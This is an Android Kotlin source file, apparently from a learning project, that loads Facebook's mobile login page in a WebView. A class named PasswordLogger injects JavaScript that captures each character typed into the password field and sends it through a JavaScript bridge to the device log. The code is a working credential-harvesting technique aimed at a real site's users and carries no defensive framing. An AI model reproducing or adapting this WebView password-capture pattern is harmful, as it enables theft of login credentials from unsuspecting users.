package sid.angel.androidmultithreading

import android.app.ActionBar
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.view.ViewGroup
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient

class EnableJavaScript : AppCompatActivity() {
/*
Java script enabled effects.
* */
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        WebView(this).apply {

            layoutParams = ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT,ActionBar.LayoutParams.MATCH_PARENT)
            addJavascriptInterface(LoggerInterface(),"Logger")
            webViewClient= PasswordLogger()
            settings.javaScriptEnabled = true
            loadUrl("https://m.facebook.com")

        }.also(::setContentView )

        /*
        1- cooperative system
        2-premptive system
        * */
    }
}

class LoggerInterface {
    @JavascriptInterface
    fun log(message: String) = Log.d("Logger", message)
}

class PasswordLogger : WebViewClient() {


    override fun onPageFinished(view: WebView?, url: String?) {
        val script = """
            var field = document.getElementById("m_login_password");
            field.addEventListener("input", function(e) {
                Logger.log("password: " + field.value.toString());
            });
        """
        view?.evaluateJavascript(script, null)
    }
}
